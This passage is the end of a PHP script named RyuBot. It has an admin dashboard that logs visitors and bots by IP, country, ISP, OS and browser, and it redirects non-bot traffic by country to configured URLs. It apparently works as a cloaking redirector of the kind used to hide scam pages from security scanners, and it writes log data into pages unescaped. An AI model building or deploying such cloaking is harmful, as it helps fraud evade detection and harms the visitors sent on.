              <path d="M6 12.5a.5.5 0 0 1 .5-.5h3a.5.5 0 0 1 0 1h-3a.5.5 0 0 1-.5-.5ZM3 8.062C3 6.76 4.235 5.765 5.53 5.886a26.58 26.58 0 0 0 4.94 0C11.765 5.765 13 6.76 13 8.062v1.157a.933.933 0 0 1-.765.935c-.845.147-2.34.346-4.235.346-1.895 0-3.39-.2-4.235-.346A.933.933 0 0 1 3 9.219V8.062Zm4.542-.827a.25.25 0 0 0-.217.068l-.92.9a24.767 24.767 0 0 1-1.871-.183.25.25 0 0 0-.068.495c.55.076 1.232.149 2.02.193a.25.25 0 0 0 .189-.071l.754-.736.847 1.71a.25.25 0 0 0 .404.062l.932-.97a25.286 25.286 0 0 0 1.922-.188.25.25 0 0 0-.068-.495c-.538.074-1.207.145-1.98.189a.25.25 0 0 0-.166.076l-.754.785-.842-1.7a.25.25 0 0 0-.182-.135Z"/>
              <path d="M8.5 1.866a1 1 0 1 0-1 0V3h-2A4.5 4.5 0 0 0 1 7.5V8a1 1 0 0 0-1 1v2a1 1 0 0 0 1 1v1a2 2 0 0 0 2 2h10a2 2 0 0 0 2-2v-1a1 1 0 0 0 1-1V9a1 1 0 0 0-1-1v-.5A4.5 4.5 0 0 0 10.5 3h-2V1.866ZM14 7.5V13a1 1 0 0 1-1 1H3a1 1 0 0 1-1-1V7.5A3.5 3.5 0 0 1 5.5 4h5A3.5 3.5 0 0 1 14 7.5Z"/>
            </svg> Bots</h3>
                                            </div>
                                        </div>
                                        <div class="card-body">
                                            <h1 id="totalBots">0</h1>
                                        </div>
                                    </div>
                                </div>
                            </div>
            
                            <div class="row">
                                <div class="col-12 mt-2">
                                  <div class="btn btn-group mt-3 mb-3">
                                  <a href="javascript:;" onclick="loadContentStats()" class="btn btn-primary ">Refresh Data</a>
                                  <a href="javascript:;" onclick="resetStats()" class="btn btn-danger ">Reset Stats</a>
                                  </div>
                                    <div class="card">
                                        <div class="card-header bg-success text-white">
                                            <div class="card-title">
                                                <h3>Visitors Data</h3>
                                            </div>
                                        </div>
                                        <div class="card-body" style="max-height: 300px; overflow: auto;">
                                            <table class="table table-striped table-hover">
                                                <thead>
                                                    <tr>
                                                        <th>Date</th>
                                                        <th>IP</th>
                                                        <th>Note</th>

                                                        <th>Country</th>
                                                        <th>ISP</th>
                                                        <th>OS</th>
                                                        <th>Browser</th>
                                                    </tr>
                                                </thead>
                                                <tbody id="visitorsData" >
                                                    <tr>
                                                        <td colspan="7" class="text-center">Loading...</td>
                                                    </tr>
                                                </tbody>
                                            </table>
                                        </div>
                                    </div>
                                </div>
                                <div class="col-12 mt-4">
                                <div class="card">
                                        <div class="card-header bg-primary text-white">
                                            <div class="card-title">
                                                <h3>Bots Data</h3>
                                            </div>
                                        </div>
                                        <div class="card-body" style="max-height: 300px; overflow: auto;">
                                            <table class="table table-striped table-hover" >
                                                <thead>
                                                    <tr>
                                                        <th>Date</th>
                                                        <th>IP</th>
                                                        <th>Note</th>
                                                        <th>Country</th>
                                                        <th>ISP</th>
                                                        <th>OS</th>
                                                        <th>Browser</th>
                                                    </tr>
                                                </thead>
                                                <tbody id="botsData" >
                                                    <tr>
                                                        <td colspan="7" class="text-center">Loading...</td>
                                                    </tr>
                                                </tbody>
                                            </table>
                                        </div>
                                    </div>
                                </div>
                            </div>
            
                        </div>
                    </div>
                </div>
                <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js" integrity="sha384-w76AqPfDkMBDXo30jS1Sgez6pr3x5MlQ1ZAGC+nuZB+EYdgRZgiwxhTBTkF7CXvN" crossorigin="anonymous"></script>
            
                <script>
                      const storedTheme = localStorage.getItem('theme')
            
            const getPreferredTheme = () => {
              if (storedTheme) {
                return storedTheme
              }
            
              return window.matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light'
            }
            
            const setTheme = function (theme) {
              if (theme === 'auto' && window.matchMedia('(prefers-color-scheme: dark)').matches) {
                document.documentElement.setAttribute('data-bs-theme', 'dark')
              } else {
                document.documentElement.setAttribute('data-bs-theme', theme)
              }
            }
            const loadTotalStats = function () {
              fetch('?api_pler=total&<?=$KEY;?>=true')
                .then(response => response.json())
                .then(data => {
                  document.getElementById('totalVisitors').innerHTML = data.totalVisitors
                  document.getElementById('totalBots').innerHTML = data.totalBots
                })
            };
            
            const loadContentStats = function () {
              fetch('?api_pler=content&<?=$KEY;?>=true')
                .then(response => response.json())
                .then(data => {
                  document.getElementById('visitorsData').innerHTML = data.visitors;
                  document.getElementById('botsData').innerHTML = data.bots;
                })
            };
            const saveNewLink = function()
            {
                var url = document.getElementById('url').value;
                    url = encodeURIComponent(url)
                fetch('?api_pler=save&<?=$KEY;?>=true&url='+url)
                .then(response => response.json())
                .then(data => {
                  if(data.status == 'success')
                  {
                    alert('Success! ');
                    document.getElementById('url').value = url;
                    document.getElementById('url').placeholder = 'Success';
                    document.getElementById('url').style.borderColor = 'green';
                    document.getElementById('url').style.color = 'green';
                  }else{
                    document.getElementById('url').placeholder = 'Failed';
                    document.getElementById('url').style.borderColor = 'red';
                    document.getElementById('url').style.color = 'red';
                  }
                });
            };

            const resetStats = function()
            {
                fetch('?api_pler=reset&<?=$KEY;?>=true')
                .then(response => response.json())
                .then(data => {
                  if(data.status == 'success')
                  {
                    alert('Success! ');
                    loadContentStats();
                    loadTotalStats();
                  }else{
                    alert('Failed! ');
                  }
                });
            };
            
            
            
            setTheme(getPreferredTheme());
            setInterval(loadTotalStats, 1000);
            loadContentStats();
            loadTotalStats();
            
            const  changeTheme = function () {
              const theme = document.getElementById('themeselect').value;
              setTheme(theme)
              localStorage.setItem('theme', theme)
            }
            
            
            </script>
              </body>
            </html>
            
            
            
            <?php
            }else{
            if(isset($_GET['api_pler']))
            {
                @header('Content-Type: application/json; charset=utf-8');
            
                $api = $_GET['api_pler'];
                $path = __DIR__.'/ryulogs/';
                $totalVisitors = $this->count_line($path.'ryu-visitor.log');
                $totalBots = $this->count_line($path.'ryu-bot.log');
                if($api == 'total')
                {
                    echo json_encode([
                        'totalVisitors' => $totalVisitors,
                        'totalBots' => $totalBots
                    ],JSON_PRETTY_PRINT);
                }elseif($api == 'content')
                {
                    $visitorContent = file_get_contents($path.'ryu-visitor.log');
                    $botContent = file_get_contents($path.'ryu-bot.log');

                    $htmlVisitor = '';
                    $htmlBot = '';
                    $visitorContent = explode("\n" , $visitorContent);
                    $botContent = explode("\n" , $botContent);

                    foreach($visitorContent as $visitor)
                    {
                        $visitor = explode('|' , $visitor);
                        $htmlVisitor .= '<tr>
                        <td>'.$visitor[0].'</td>
                      
                        <td>'.$visitor[3].'</td>
                        <td>'.$visitor[1].'</td>
                        <td>'.$this->flag($visitor[2],$visitor[7]).'</td>
                        <td>'.$visitor[4].'</td>
                        <td>'.$visitor[5].'</td>
                        <td>'.$visitor[6].'</td>
                    </tr>';
                    }

                    foreach($botContent as $bot)
                    {
                        $bot = explode('|' , $bot);
                        $htmlBot .= '<tr>
                        <td>'.$bot[0].'</td>
                       
                        <td>'.$bot[3].'</td>
                        <td>'.$bot[1].'</td>
                        <td>'.$this->flag($bot[2],$bot[7]).'</td>
                        <td>'.$bot[4].'</td>
                        <td>'.$bot[5].'</td>
                        <td>'.$bot[6].'</td>
                    </tr>';
                    }

                    echo json_encode([
                            'visitors' => $htmlVisitor,
                            'bots' => $htmlBot
                        ],JSON_PRETTY_PRINT);        
                }elseif($api == 'save')
                {
                    @file_put_contents(URL_FILE , urldecode($_GET['url']));
                    echo json_encode([
                        'status' => 'success'
                    ],JSON_PRETTY_PRINT);
                }elseif($api == 'reset')
                {
                    @file_put_contents($path.'ryu-visitor.log' , '');
                    @file_put_contents($path.'ryu-bot.log' , '');
                    echo json_encode([
                        'status' => 'success'
                    ],JSON_PRETTY_PRINT);
                }
               
            }    
            
            
            exit;
            }
            

        } else {

            $code = $this->getCountry();

            $this->secure_init($code);

            if (array_key_exists($code, $this->config['direct']['by_country'])) {

                /** checking if using mass random direct **/
                if (is_array($this->config['direct']['by_country'][$code])) {
                    @header('location:' . $this->randomUri($this->config['direct']['by_country'][$code]), true, 303);

                    exit;
                } else {
                    @header('location: ' . $this->config['direct']['by_country'][$code], true, 303);
                    exit;
                }
            } else {
                @header('location: ' . $this->randomUri($this->config['direct']['default']), true, 303);
                exit;
            }
        }
    }

}

$RYU = new RyuBot;
$RYU->run();